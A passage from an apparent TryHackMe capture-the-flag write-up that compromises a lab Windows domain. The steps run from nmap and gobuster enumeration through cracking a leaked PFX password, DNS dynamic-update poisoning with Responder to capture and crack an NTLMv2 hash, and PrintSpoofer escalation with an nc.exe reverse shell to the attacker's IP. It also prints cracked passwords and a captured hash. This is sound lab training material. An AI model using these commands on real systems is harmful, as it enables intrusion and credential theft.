| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf              syn-ack .NET Message Framing
49666/tcp open  msrpc               syn-ack Microsoft Windows RPC
49668/tcp open  msrpc               syn-ack Microsoft Windows RPC
49669/tcp open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc               syn-ack Microsoft Windows RPC
49673/tcp open  msrpc               syn-ack Microsoft Windows RPC
49690/tcp open  msrpc               syn-ack Microsoft Windows RPC
49700/tcp open  msrpc               syn-ack Microsoft Windows RPC
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.91%I=7%D=5/9%Time=6097F375%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/st
SF:reams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-streams
SF:\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.91%I=7%D=5/9%Time=6097F375%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/st
SF:reams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-streams
SF:\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.91%I=7%D=5/9%Time=6097F375%P=x86_64-pc-linux-gnu%r(RPC
SF:Check,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/st
SF:reams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-streams
SF:\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.91%I=7%D=5/9%Time=6097F361%P=x86_64-pc-linux-gnu%r(Get
SF:Request,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2009\x20May\x2020
SF:21\x2014:36:18\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\x2
SF:017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20byt
SF:es\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<met
SF:a\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>\n
SF:<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Illega
SF:l\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x2
SF:0Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</p
SF:re>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL
SF:=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length
SF::\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><p
SF:re>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,C3
SF:,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:
SF:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection
SF::\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal
SF:\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x20
SF:400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20character
SF:\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTPOp
SF:tions,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2009\x20May\x202021\
SF:x2014:36:28\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.91%T=SSL%I=7%D=5/9%Time=6097F378%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2009\x20May
SF:\x202021\x2014:36:41\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202
SF:020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\
SF:x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>
SF:\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</h
SF:ead>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x20200
SF:\x20OK\r\nDate:\x20Sun,\x2009\x20May\x202021\x2014:36:41\x20GMT\r\nAllo
SF:w:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x2040
SF:0\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-
SF:1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Me
SF:ssage\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck,
SF:C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-T
SF:ype:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnec
SF:tion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Ill
SF:egal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP
SF:/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20te
SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20c
SF:lose\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20ch
SF:aracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\
SF:x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;chars
SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<
SF:h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CN
SF:TL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type
SF::\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnectio
SF:n:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20
SF:URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10518/tcp): CLEAN (Timeout)
|   Check 2 (port 34843/tcp): CLEAN (Timeout)
|   Check 3 (port 44812/udp): CLEAN (Timeout)
|   Check 4 (port 16277/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-09T14:37:23
|_  start_date: N/A
```

We got 4 hostnames `windcorp.thm`, `fire.windcorp.thm`, `selfservice.windcorp.thm`, `selfservice.dev.windcorp.thm`. So adding them gives access to the main site `fire.windcorp.thm` and `selfservice.windcorp.thm` has basic HTTP auth enabled. And `selfservice.dev.windcorp.thm` show that the site is under construction.

# Gobuster -> fire.windcorp.thm

gobuster dir -u https://fire.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -o gobuster/initial

```
/powershell           (Status: 302) [Size: 165] [--> /powershell/default.aspx?ReturnUrl=%2fpowershell]
```

# Gobuster -> selfservice.dev.windcorp.thm

gobuster dir -u https://selfservice.dev.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -o gobuster/selfservice

```
/backup               (Status: 301) [Size: 167] [--> https://selfservice.dev.windcorp.thm/backup/]
/Backup
```

Accessing `https://selfservice.dev.windcorp.thm/backup` we got 2 files. `cert.pfx` can be downloaded but `web.config` can't be done.

We can try to decrypt cert.pfx but requires password.

openssl pkcs12 -in cert.pfx

Let's try cracking using john.

# JohnTheRipper

/usr/share/john/pfx2john.py cert.pfx | john /dev/stdin


```
Took time!
```

# crackpkcs12

crackpkcs12 -d /usr/share/wordlists/rockyou.txt cert.pfx 

```
Dictionary attack - Starting 5 threads

*********************************************************
Dictionary attack - Thread 3 - Password found: ganteng
*********************************************************
```

Also port 53 is open ,so let's do some research using dig. Let's look through variuos records like NS, MX and TXT.

dig @10.10.224.101 windcorp.thm -t NS

```
; <<>> DiG 9.16.13-Debian <<>> @10.10.224.101 windcorp.thm -t NS
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5261
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.			IN	NS

;; ANSWER SECTION:
windcorp.thm.		3600	IN	NS	fire.windcorp.thm.

;; ADDITIONAL SECTION:
fire.windcorp.thm.	3600	IN	A	10.10.224.101
fire.windcorp.thm.	3600	IN	A	192.168.112.1

;; Query time: 180 msec
;; SERVER: 10.10.224.101#53(10.10.224.101)
;; WHEN: Sun May 09 11:18:39 EDT 2021
;; MSG SIZE  rcvd: 92
```

dig @10.10.224.101 windcorp.thm -t MX

```
; <<>> DiG 9.16.13-Debian <<>> @10.10.224.101 windcorp.thm -t MX
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20470
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.			IN	MX

;; AUTHORITY SECTION:
windcorp.thm.		3600	IN	SOA	fire.windcorp.thm. hostmaster.windcorp.thm. 294 900 600 86400 3600

;; Query time: 184 msec
;; SERVER: 10.10.224.101#53(10.10.224.101)
;; WHEN: Sun May 09 11:19:08 EDT 2021
;; MSG SIZE  rcvd: 93
```

dig @10.10.224.101 windcorp.thm -t TXT

```
; <<>> DiG 9.16.13-Debian <<>> @10.10.224.101 windcorp.thm -t TXT
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64706
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.			IN	TXT

;; ANSWER SECTION:
windcorp.thm.		86400	IN	TXT	"THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}" => 🔥Flag

;; Query time: 184 msec
;; SERVER: 10.10.224.101#53(10.10.224.101)
;; WHEN: Sun May 09 11:19:42 EDT 2021
;; MSG SIZE  rcvd: 188
```

But the flag has a deeper meaning. Maybe the next step we have to do.

**Reference: https://ns1.com/resources/dns-types-records-servers-and-queries**

openssl pkcs12 -in cert.pfx -info 

```
MAC: sha256, Iteration 2000
MAC length: 32, salt length: 20
PKCS7 Data
Shrouded Keybag: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIg1mu7J1vhMICAggA
MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECET4/lrxguyvBIIEyL/9MaK/sQvl
a8/t0CLL81uSjFa0YDMu7FEPW9CoNglPwZZ0jovLUAtx+lxjCq3Mn92DlS5B63w3
/a51XJ/2I0HOCAc32nR5SNhF9p3EH0Zr0d2QjtLxFj8o7XlyAFwScftBvzjmRfy+
i1cpc5YPfCjil75QBBRw08Ht3+Q6RzLhEH5M+TePqEDYlEIXD569I5M561JCUajV
vW6wvYR5M5060ITMwNVW4CNwSrwmCj6r5vlzI2m9GLOg2q5MQyTtfmPJbDhUo7n3
D2SZ4DCxgL6goDjoBc1J1ojtWcMD0mKQDR+djOjocm0vbPpK4s0viZgXZigIRyUP
CtsBGb6f4zhzjCWX8KyvcJGX78etsgRmwXxPbFoJq32GzMoTNFAILlYwjnbhITQY
qM6PfjFWbxtQCBNygLuNfUP7Tz8fKQCyRs7RIFMk4kMpuGdZ3ppvzPan4LXxWRTL
CTTDY4PmRDt2VlZnKCVhZ+tgS0xMswaBhTfCbuUIG+kzKz4lQatsrI2F57zp3bI3
5ktKWESjmSaVrfaTZDfwmReyRBOeJf/4+qjxEKr2aRcTZA93YlY/05fHNCTIXjLA
SQxA3ewHib9ioh40rxaGFygZlfVEkGEawvT9FT1DVd4NZEf0/ltv3e3xlw8hYVUm
eGg/i/Y1bPrNiYOSernL0A2xIMAjC/l7jsWNqrU1DWXyqTb24q8FYfeidFVtBvgl
R7ZhS3e1LbAcceVL/KoVoNKVgTcRlld21IxjZcxyfCrjLPMwTodbToeZRMYVOZqr
AaxN8ng87N5GN21hLLjuLCih+45KUp9dVfMht+s3gBmH4YsShi8+DED4FZCaw3mm
7rbrKg+N9rfrLvTuCvVKbbJ+07W2YHnRqUobifnYk3SbTeBdYezOls/iJf/9IyRh
oQm1vtF9BTc982Ml90tc2yY+GyHOWFGGxUXuwQS34sPSm6cgtaRpck0sKRQawFy2
z9Sweu4D7VahlgA183A6fN9l/SNRCk+CTK3xf5fSrheSO6WxJ2Qa4wGNze/2zreo
ChKjcR1gV5a1BycfQgslN39av6V8BMSTz6jCTww2N2LVBEbnht8yQjmEfNwYVnQP
NtRyRCcZ9hzqXoRD10E1TTCJDQoq8bZcqZbU2OmMwJczmE/DnDyTawGxAZs3xkZ+
jE1ofPezrAV4kSiBYi5sWMH1tgab3l5KA/mQqgL9m4fsRjZV90CPzZJsjtZU13D4
Fv0bvZmY50Oi6sa9xMkPcLzTACpIVKp6ToaorYCblOdS+yrPt9jpvfBs+8i9qyr8
iuw1TtGkhxaW0FV6+JlyU3lvZQm+82L2zwrcQCsJxhXqruq/A3WyL+36zT+xPCXp
2WASuTmBeAgTzAYsXWbWT7vTB8NGm4IEI/wQZChArcLFsEI569a68LAIgR/CNzu9
6IJC09YlW8nnpF5aVW2krYTyoic2Acz/R9AmuJAvaxr2sFs6GZjiOk19yd++VEOP
QxHZnIDGb/HnhksrqpjIOVy8KpKuvgBNqs0DdtUsjTM+yCC26QnBDY3CDJSnfZ5P
5bnJIIAzCeZQDpSbIj48xSRWM5oOm++smK61fHTy6DAx9ZOyeJPp6oRui3kdrrKc
jtuMLXyLQmLCkuKa/xv7rA==
-----END ENCRYPTED PRIVATE KEY-----
PKCS7 Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
Certificate bag
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = fire.windcorp.thm

issuer=CN = fire.windcorp.thm

-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
MTUqFyYKchFUeYlgf7k=
-----END CERTIFICATE-----
```

Now let's try to add a text record using dynamic update. 

# nsupdate 

```
> server 10.10.161.0
> update add test.windcorp.thm 5 TXT "Don't mind me.."
> send
```

Checking if records are updated.

nslookup 

```
> SERVER 10.10.161.0
Default server: 10.10.161.0
Address: 10.10.161.0#53
> set type=txt
> test.windcorp.thm
Server:		10.10.161.0
Address:	10.10.161.0#53

test.windcorp.thm	text = "Don't mind me.."
```

Woow! They are updated which means we can add records. First we add certificate to Responder. We need to extract the contents of the pfx to a certificate-file and a key-file.

```
openssl pkcs12 -in cert.pfx -out selfservice.crt.pem -clcerts -nokeys
openssl pkcs12 -in cert.pfx -out selfservice.key.pem -nocerts -nodes
```

Now let's edit the responder conf file.

```
[HTTPS Server]

; Configure SSL Certificates to use
SSLCert = /usr/share/responder/selfservice.crt.pem
SSLKey = /usr/share/responder/selfservice.key.pem
```

nsupdate

```
> server 10.10.217.128
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 12345 A 10.8.107.21
> send
```

Checking if updated.

dig @10.10.217.128 selfservice.windcorp.thm

```
; <<>> DiG 9.16.13-Debian <<>> @10.10.217.128 selfservice.windcorp.thm
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25336
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;selfservice.windcorp.thm.	IN	A

;; ANSWER SECTION:
selfservice.windcorp.thm. 12345	IN	A	10.8.107.21

;; Query time: 308 msec
;; SERVER: 10.10.217.128#53(10.10.217.128)
;; WHEN: Mon May 10 03:42:27 EDT 2021
;; MSG SIZE  rcvd: 69
```

And starting responder we get the NTLM hash by posioning DNS caches.

sudo responder -I tun0

```
[HTTP] NTLMv2 Client   : 10.10.217.128
[HTTP] NTLMv2 Username : WINDCORP\edwardle
[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:2a3625cab590a9c3:460B917BAD53128A1C7B46D47545F323:0101000000000000939564057345D701E66E736F5836FF95000000000200080041004A004600580001001E00570049004E002D004D005900330053004D004A00580039003300310032000400140041004A00460058002E004C004F00430041004C0003003400570049004E002D004D005900330053004D004A00580039003300310032002E0041004A00460058002E004C004F00430041004C000500140041004A00460058002E004C004F00430041004C000800300030000000000000000100000000200000A496A79DB7E8B5C7012F3762205A2411ED309F1A85AE037F94E2344355F2B8F80A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000
```

Let's crack it using John!

john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```
!Angelus25!      (edwardle)
```

And we can use this to login into the powershell in fire.windcorp.thm site. 

# Flag 2.txt

```
THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}
``` 

Let's check for privileges.

whoami /priv

 
```
PRIVILEGES INFORMATION

----------------------

 

Privilege Name                Description                               State  

============================= ========================================= =======

SeMachineAccountPrivilege     Add workstations to domain                Enabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled => Wow ! Just Wow!!	

SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

The SeImpersonatePrivilege was well known to me as a potential attack vector. I know at least two ways how to use the privilege to escalate localy obtaining SYSTEM privileges.

First one — PrintSpoofer, second one — SweetPotato.

I used printerSpoofer and got a shell as admin. We have to transfer `nc.exe` and `printerspoofer.exe` now we have to execute `.\printerspoofer.exe -c ".\nc.exe 10.8.107.21 1234 -e cmd"`. And we have a shell as `windcorp\fire$`


# Flag 3.txt

```
THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
```